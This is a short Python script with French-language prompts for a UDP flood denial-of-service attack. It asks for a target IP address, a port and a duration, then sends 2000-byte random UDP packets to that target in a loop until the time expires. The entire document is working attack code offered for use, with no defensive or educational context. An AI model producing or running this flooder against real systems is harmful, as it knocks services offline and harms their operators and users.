```
import socket
import random
import time

ip = input("Entrez l'adresse IP : ")
port = int(input("Port : "))
duration = int(input("Temps : "))
timeout = time.time() + duration

def DoS(ip, port, duration):
           sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
           packets = random._urandom(2000)
           print("Envoie de Packets en cours..")
           while DoS:
                if time.time() > timeout:
                  break
                else:
                    pass
                sock.sendto(packets, (ip, port))
DoS(ip, port, duration)
```
